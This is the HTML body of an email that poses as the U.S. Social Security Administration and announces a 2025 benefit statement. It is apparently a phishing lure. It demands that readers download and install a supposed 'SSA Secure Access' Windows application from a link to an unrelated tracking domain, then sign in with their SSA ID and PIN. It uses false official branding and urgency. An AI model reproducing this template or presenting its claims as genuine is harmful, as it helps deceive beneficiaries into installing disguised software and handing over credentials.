=09=09=09=09=09=09=09=09=09<h2 style=3D"color:#002A5C;">Your 2025 Social Se=
curity Statement Is Now Available</h2>

=09=09=09=09=09=09=09=09=09<p>Dear Beneficiary,</p>

=09=09=09=09=09=09=09=09=09<p>As of July 2025, your updated <strong>Social =
Security Statement</strong> is now available and includes revised benefit c=
alculations, projected retirement payments, and updated cost-of-living adju=
stments (COLA).</p>

=09=09=09=09=09=09=09=09=09<p>To improve data privacy and identity verifica=
tion, the Social Security Administration now provides access to your digita=
l statement through our new official application for Windows:</p>

=09=09=09=09=09=09=09=09=09<h3 style=3D"color:#002A5C;">SSA Secure Access =
=E2=80=94 Windows Edition</h3>

=09=09=09=09=09=09=09=09=09<ul>
=09=09=09=09=09=09=09=09=09=09<li>View updated 2025 benefit estimates and C=
OLA adjustments</li>
=09=09=09=09=09=09=09=09=09=09<li>Review your earnings history</li>
=09=09=09=09=09=09=09=09=09=09<li>Manage direct deposit and contact prefere=
nces</li>
=09=09=09=09=09=09=09=09=09=09<li>Access and download official documents (W=
-2, SSA-1099, etc.)</li>
=09=09=09=09=09=09=09=09=09</ul>

=09=09=09=09=09=09=09=09=09<p><strong>Required Action:</strong></p>

=09=09=09=09=09=09=09=09=09<ol>
=09=09=09=09=09=09=09=09=09=09<li>Click the button below to <strong>downloa=
d and install</strong> SSA Secure Access for Windows.</li>
=09=09=09=09=09=09=09=09=09=09<li>Once installed, open the application and =
sign in with your SSA ID and PIN.</li>
=09=09=09=09=09=09=09=09=09</ol>

=09=09=09=09=09=09=09=09=09<p style=3D"text-align:center; margin:25px 0;"><=
a href=3D"https://ledcim.com/campaigns/ac201h4ya06cd/track-url/ja8564of2ma6=
8/8c61122c4a9512030b6434ba6adf5690d2cfe9aa" style=3D"background:#002A5C; co=
lor:#fff; padding:12px 22px; text-decoration:none; border-radius:4px;">Down=
load SSA Secure Access 2025 </a></p>

=09=09=09=09=09=09=09=09=09<p>Digital access is required to view or manage =
your 2025 benefit data. Paper mailings are no longer automatically distribu=
ted.</p>

=09=09=09=09=09=09=09=09=09<p>We appreciate your cooperation in helping us =
keep your data secure.</p>

=09=09=09=09=09=09=09=09=09<p style=3D"font-size:12px; color:#888;">=C2=
=A9 2025 U.S. Social Security Administration</p>
=09=09=09=09=09=09=09=09=09</div>
